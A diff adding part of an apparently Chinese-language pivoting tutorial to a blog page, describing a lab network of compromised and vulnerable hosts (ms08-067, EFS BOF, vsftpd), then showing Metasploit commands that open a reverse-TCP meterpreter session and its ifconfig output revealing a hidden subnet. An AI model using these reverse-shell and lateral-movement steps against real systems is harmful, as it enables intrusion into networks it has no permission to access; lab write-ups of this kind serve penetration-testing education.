@@ -135,6 +135,57 @@
 </code></pre>
 </div>
 <p><img src="https://pentest.blog/wp-content/uploads/final.png" /></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>说明:
+1)Attacker为攻击者,有一个网卡,网段为172.16.0.0
+2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段
+3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs bof两个漏洞,可getshell
+4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell
+5)起初Attacker只拿到RD的msf的shell,对于目标内网情况一无所知,也不知道存在7.7.7.0和8.8.8.0这两个隐藏的网段
+6)目标是准备通过RD来渗透内网中7.7.7.0和8.8.8.0两个隐藏的网段
+</code></pre>
+</div>
+
+<h3 id="step1">Step1</h3>
+
+<p>Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST 172.16.0.20 
+LHOST =&gt; 172.16.0.20
+msf exploit(handler) &gt; set LPORT 1234
+LPORT =&gt; 1234
+msf exploit(handler) &gt; run
+[*] Started reverse TCP handler on 172.16.0.20:1234 
+[*] Starting the payload handler...
+[*] Sending stage (957487 bytes) to 172.16.0.11
+[*] Meterpreter session 2 opened (172.16.0.20:1234 -&gt; 172.16.0.11:49162)
+meterpreter &gt; ifconfig
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+Interface 11
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:e1:3f:af
+MTU          : 1500
+IPv4 Address : 172.16.0.11
+IPv4 Netmask : 255.255.255.0
+Interface 19
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
+Hardware MAC : 08:00:27:7f:3c:fe
+MTU          : 1500
+IPv4 Address : 7.7.7.11
+IPv4 Netmask : 255.255.255.0
+</code></pre>
+</div>
 </span>
 
         
